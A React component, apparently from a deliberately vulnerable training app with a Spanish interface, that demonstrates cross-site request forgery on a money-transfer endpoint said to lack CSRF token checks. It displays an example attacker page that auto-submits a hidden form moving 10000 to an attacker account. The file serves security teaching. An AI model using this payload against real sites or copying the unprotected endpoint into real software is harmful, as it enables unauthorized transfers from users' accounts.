import React, { useState } from 'react';
import apiService from '../../services/api';
import { TransferData } from '../../types';

interface TransferResult {
  success: boolean;
  message: string;
}

const CSRF: React.FC = () => {
  const [fromAccount, setFromAccount] = useState<string>('');
  const [toAccount, setToAccount] = useState<string>('');
  const [amount, setAmount] = useState<string>('');
  const [result, setResult] = useState<TransferResult | null>(null);

  const handleTransfer = async (): Promise<void> => {
    try {
      const transferData: TransferData = { fromAccount, toAccount, amount };
      const response = await apiService.transfer(transferData);
      setResult({ success: true, message: response.message });
    } catch (error: any) {
      setResult({ 
        success: false, 
        message: error.response?.data?.error || 'Error en la transferencia' 
      });
    }
  };

  const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';
  
  const maliciousHTML = `
<!-- Página maliciosa que podría estar en otro dominio -->
<html>
<body onload="document.forms[0].submit()">
  <h1>Felicidades! Has ganado un premio!</h1>
  <form action="${API_URL}/api/transfer" method="POST">
    <input type="hidden" name="fromAccount" value="cuenta-victima" />
    <input type="hidden" name="toAccount" value="cuenta-atacante" />
    <input type="hidden" name="amount" value="10000" />
  </form>
</body>
</html>
  `;

  return (
    <div className="vulnerability-section">
      <h2>Cross-Site Request Forgery (CSRF)</h2>
      
      <div className="alert alert-info">
        <strong>Vulnerabilidad:</strong> El endpoint de transferencias no valida tokens CSRF, 
        permitiendo que sitios maliciosos realicen transferencias en nombre del usuario autenticado.
      </div>

      <div className="transfer-form">
        <h3>Formulario de Transferencia</h3>
        
        <div className="form-group">
          <label>Cuenta Origen:</label>
          <input 
            type="text" 
            value={fromAccount}
            onChange={(e) => setFromAccount(e.target.value)}
            placeholder="Número de cuenta origen"
          />
        </div>

        <div className="form-group">
          <label>Cuenta Destino:</label>
          <input 
            type="text" 
            value={toAccount}
            onChange={(e) => setToAccount(e.target.value)}
            placeholder="Número de cuenta destino"
          />
        </div>

        <div className="form-group">
          <label>Monto:</label>
          <input 
            type="number" 
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="Monto a transferir"
          />
        </div>

        <button onClick={handleTransfer} className="btn btn-primary">
          Realizar Transferencia
        </button>

        {result && (
          <div className={`alert ${result.success ? 'alert-success' : 'alert-danger'}`}>
            {result.message}
          </div>
        )}
      </div>

      <div style={{ marginTop: '30px' }}>
        <h3>Ejemplo de ataque CSRF:</h3>
        <pre style={{ fontSize: '12px' }}>{maliciousHTML}</pre>
      </div>

      <div className="alert alert-danger" style={{ marginTop: '20px' }}>
        <strong>Impacto:</strong> Un atacante puede engañar a usuarios autenticados para que 
        realicen acciones no deseadas como transferencias de dinero, cambios de configuración, etc.
      </div>
    </div>
  );
};

export default CSRF;
